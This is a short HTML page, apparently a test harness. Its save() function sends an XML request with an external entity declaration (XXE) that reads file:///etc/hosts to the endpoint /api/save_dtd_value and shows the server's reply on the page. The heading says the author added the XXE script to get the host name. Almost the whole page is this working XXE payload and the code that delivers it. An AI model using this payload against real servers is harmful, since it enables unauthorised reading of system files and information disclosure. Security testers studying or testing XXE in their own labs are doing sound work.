<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>DTD Example</title>
</head>
<body>
<h1>this is the example i added a xxe script to get host name</h1>

<input type="text" id="dataInput" />
<button onclick="save()">Save</button>

<pre id="output"></pre>

<script>
function save() {
    const value = document.getElementById("dataInput").value.trim();

    if (!value) {
        alert("Value cannot be empty");
        return;
    }

  const xmlData = `<?xml version="1.0"?>
<!DOCTYPE request [
    <!ELEMENT request (value)>
    <!ELEMENT value (#PCDATA)>
    <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<request>
    <value>&xxe;</value>
</request>`;


    fetch("/api/save_dtd_value", {
        method: "POST",
        headers: {
            "Content-Type": "application/xml"
        },
        body: xmlData
    })
    .then(res => res.text())
    .then(data => {
        document.getElementById("output").textContent = data;
    });
}
</script>

</body>
</html>
